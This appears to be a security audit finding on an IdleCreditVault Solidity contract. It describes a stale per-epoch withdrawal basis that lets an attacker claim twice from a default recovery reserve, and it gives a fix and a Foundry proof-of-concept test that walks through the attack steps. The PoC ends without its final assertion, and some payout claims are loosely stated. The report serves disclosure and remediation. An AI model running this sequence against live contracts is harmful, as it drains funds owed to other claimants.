### Title
Claimed instant-withdraw receipt basis is never cleared, letting a defaulted-epoch claim be paid twice from the recovery reserve - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`requestInstantWithdraw` records receipt basis in two places: the aggregate `instantWithdrawsRequests[user]` and the per-epoch pair `instantWithdrawsRequestsByEpoch[user][epoch]` / `instantWithdrawClaimsByEpoch[epoch]`. A successful funded claim via `claimInstantWithdrawRequest` clears only the aggregate, leaving the per-epoch basis permanently set — the same "counter not reset after state transition" class as the QVBaseStrategy `reviewsByStatus` bug. If the vault later defaults in that same epoch, `_claimDefaultedInstantWithdrawRequest` re-reads the stale per-epoch basis and pays the user again from `defaultRecoveryReserve`, while `defaultPendingClaimBasis` double-counts the already-paid amount, corrupting `defaultRecoveryPrice` for all claimants.

### Finding Description
In `requestInstantWithdraw` (`IdleCreditVault.sol:356-375`), each request increments `instantWithdrawsRequests[_user]`, `instantWithdrawsRequestsByEpoch[_user][epochNumber]`, `instantWithdrawClaimsByEpoch[epochNumber]`, and `pendingInstantWithdraws`.

When the CDO funds the request (`collectInstantWithdrawFunds`, `:398-403`) only `pendingInstantWithdraws` is decremented. When the user then claims via `claimInstantWithdrawRequest` (`:380-393`):

```solidity
uint256 amount = instantWithdrawsRequests[_user];
_burn(_user, amount);
instantWithdrawsRequests[_user] = 0;
_transferFundedClaim(_user, amount);
```

`instantWithdrawsRequestsByEpoch[_user][epoch]` and `instantWithdrawClaimsByEpoch[epoch]` are **not** cleared — the analog of `reviewsByStatus` never being reset after the status change.

Later, if that epoch ends in borrower default and `finalizeDefaultRecovery` sets `defaultRecoveryEpoch` to that epoch:

- `defaultPendingClaimBasis` (`:644-649`) adds `instantWithdrawClaimsByEpoch[epochNumber]` whenever `pendingInstantWithdraws != 0`, so the already-paid basis inflates `totalBasis` at `:680` and suppresses `defaultRecoveryPrice` at `:688`.
- `_claimDefaultedInstantWithdrawRequest` (`:842-856`) reads `instantWithdrawsRequestsByEpoch[_user][defaultEpoch]` — still nonzero — and calls `_transferDefaultRecovery(_user, claimBasis * defaultRecoveryPrice / RECOVERY_FULL)`, paying the already-claimed user a second time out of `defaultRecoveryReserve` (`:912-917`).

The only mitigation is `instantWithdrawsRequests[_user] -= claimBasis` at `:848`, which underflows and reverts unless the user holds a newer instant receipt. An attacker simply keeps a second open instant request `Y >= X` so the subtraction succeeds, burns `X` of their `Y` receipt tokens, and walks away with `X * defaultRecoveryPrice` of reserve they were never owed.

### Impact Explanation
Direct theft of `defaultRecoveryReserve`: the attacker extracts up to `X * defaultRecoveryPrice / 1e18` underlying that belongs to other defaulted-epoch and post-default claimants. Simultaneously, the inflated `totalBasis` lowers `defaultRecoveryPrice` for every legitimate claimant, so honest users recover less than the finalization math intended. Broken invariant: one receipt, one payout.

### Likelihood Explanation
Requires the same epoch to both fund an instant withdrawal and end in default. Instant withdrawals are funded whenever the CDO has liquidity mid-epoch (`collectInstantWithdrawFunds` is callable any time), while default is only decided at `stopEpoch`, so a claim-then-default ordering within one epoch is a normal sequence, not an edge case. The attacker additionally needs a second instant receipt ≥ the stale basis to pass the `-=` guard, which is trivially arranged before epoch end. No privileged collusion needed; the honest manager/borrower calls (fund request, stop epoch, finalize default) are simply sequenced around.

### Recommendation
In `claimInstantWithdrawRequest`, delete the per-epoch basis alongside the aggregate:

```solidity
uint256 epoch = ... // the request's epoch; track it per user or iterate
instantWithdrawsRequestsByEpoch[_user][epoch] = 0;
instantWithdrawClaimsByEpoch[epoch] -= amount;
```

Since a user may hold receipts from multiple epochs, store the request epoch per user (like `lastWithdrawRequest`) or clear `instantWithdrawsRequestsByEpoch[_user][epochNumber]` and decrement `instantWithdrawClaimsByEpoch` by the claimed amount, so a funded claim can never re-enter default-recovery accounting. Add a test asserting `instantWithdrawsRequestsByEpoch` and `instantWithdrawClaimsByEpoch` are zeroed/reduced after a funded claim.

### Proof of Concept
Foundry fork PoC (extend `test/foundry/IdleCreditVault.t.sol` setup with `IdleCDOEpochVariant` + `IdleCreditVault`):

```solidity
function testInstantReceiptDoubleClaimAfterDefault() external {
    IdleCreditVault cv = IdleCreditVault(address(strategy));
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");
    uint256 X = 10_000 * ONE_SCALE;
    uint256 Y = 10_000 * ONE_SCALE;

    // epoch N running
    _depositWithUser(attacker, X + Y, true);
    _depositWithUser(victim, 50_000 * ONE_SCALE, true);
    _startEpochAndCheckPrices(0);

    // 1) attacker instant-withdraws X in epoch N
    vm.prank(attacker);
    cdoEpoch.requestInstantWithdraw(X, address(AAtranche));

    // 2) honest CDO funds it, attacker claims at par
    deal(defaultUnderlying, address(cdoEpoch), X);
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds(X); // -> collectInstantWithdrawFunds
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    // BUG: byEpoch basis survives the claim
    assertEq(cv.instantWithdrawsRequestsByEpoch(attacker, cv.epochNumber()), X);
    assertGt(cv.instantWithdrawClaimsByEpoch(cv.epochNumber()), 0);

    // 3) attacker keeps a second open instant receipt Y in the same epoch
    vm.prank(attacker);
    cdoEpoch.requestInstantWithdraw(Y, address(AAtranche));

    // 4) borrower repays less -> default, then finalizeDefault at ratio r
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0); // underfunded -> defaulted
    assertTrue(cdoEpoch.defaulted());

    uint256 basis = cv.defaultPendingClaimBasis() + IERC20(address(cv)).balanceOf(address(cdoEpoch));
    uint256 recovered = basis * 7e17 / 1e18;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(cv), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // 5) attacker claims: stale X basis is paid AGAIN from defaultRecoveryReserve
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    // attacker received X * defaultRecoveryPrice on the already-claimed receipt
    // plus the funded Y remainder — i.e. more than Y, stolen from the reserve
    // that victim's claims rely on; assertEq on reserve underflow / victim shortfall.
}
```

Expected without fix: the attacker is paid `X * defaultRecoveryPrice` twice-worth of value (once at par pre-default, once from the reserve), and `defaultRecoveryPrice` itself was diluted because `instantWithdrawClaimsByEpoch[N]` still counted the paid `X`. Honest claimants' payouts are correspondingly reduced or revert when `defaultRecoveryReserve` is exhausted.
